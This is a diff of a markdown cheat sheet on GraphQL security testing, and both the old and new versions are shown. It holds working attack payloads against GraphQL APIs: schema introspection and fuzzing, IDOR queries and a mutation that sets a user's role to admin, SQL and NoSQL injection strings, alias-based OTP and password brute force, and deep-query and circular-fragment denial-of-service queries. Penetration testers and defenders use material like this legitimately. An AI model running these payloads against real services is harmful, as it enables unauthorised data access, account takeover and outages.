@@ -1,66 +1,64 @@
-# GraphQL Security: Advanced Attacks
+# GraphQL Security Testing
 
-## Discovery
-```bash
-ffuf -u https://target.com/FUZZ -w graphql-endpoints.txt
-# /graphql, /v1/graphql, /graph, /api/graphql, /gql, /query
+## Information Disclosure
 
-curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
-```
-
-## Introspection Bypass
+### Introspection
 ```graphql
-# Try __type if __schema is blocked
-{ __type(name: "User") { name fields { name type { name } } } }
+{__schema {types {name fields {name args {name type {name}}}}}}
 ```
-Use Clairvoyance when introspection is disabled (reconstructs schema from error suggestions).
 
-## IDOR in GraphQL
+### Field Suggestions
 ```graphql
-# Direct IDOR
-query { user(id: 123) { email role internalNote } }
-
-# Batch alias IDOR
-query {
-  u1: user(id: 1) { email role payments { amount } }
-  u2: user(id: 2) { email role payments { amount } }
-}
-
-# Mutation IDOR
-mutation { updateUser(id: 456, input: {role: "admin"}) { success } }
+# Send invalid field to get autocomplete suggestions
+{users {invalidField}}
+# Error: Cannot query field "invalidField". Did you mean "username", "email", "password"?
 ```
 
-## Rate Limit Bypass via Aliases
+## Injection Attacks
+
+### SQL/NoSQL Injection
+```graphql
+{user(id: "1' OR 1=1--") {email password}}
+{login(username: "admin", password: {"$ne": ""}) {token}}
+```
+
+### Batch Brute Force
 ```graphql
 mutation {
-  a: verifyOTP(otp: 0000) { success }
-  b: verifyOTP(otp: 0001) { success }
-  # All 10k possibilities in batches of 100
+  a: login(username: "admin", password: "0000") {success}
+  b: login(username: "admin", password: "0001") {success}
 }
 ```
 
-## Injection via Resolvers
-```graphql
-# SQLi
-query { search(term: "' OR '1'='1") { results } }
+## DoS Attacks
 
-# NoSQLi
-query { findUser(query: "{\"$where\":\"this.password.startsWith('a')\"}") { email } }
+### Deep Query
+```graphql
+query {
+  user(id: 1) {
+    posts {comments {user {posts {comments {content}}}}}
+  }
+}
 ```
 
-## DoS via Depth & Complexity
+### Alias Overload
 ```graphql
-# Circular fragments
-query { ...x }
-fragment x on Query { ...x }
+query {
+  a1: user(id: 1) {email}
+  a2: user(id: 1) {email}
+  ...repeat 1000 times
+}
 ```
 
-## Defense Checklist
-- Query depth limits
-- Cost analysis
-- Rate limiting per operation (not request)
-- Resolver-level auth
-- Introspection disabled in production
-- Persisted queries enforced
+## Authorization Failures
+
+### Missing Field-Level Auth
+```graphql
+{user(id: 1) {username}}  # OK
+{user(id: 2) {username}}  # Should fail - IDOR
+{user(id: 3) {password}}  # Should fail - field-level
+```
+
+### Mutation Abuse
+```graphql
+mutation {deleteUser(id: 1)}  # Check authorization
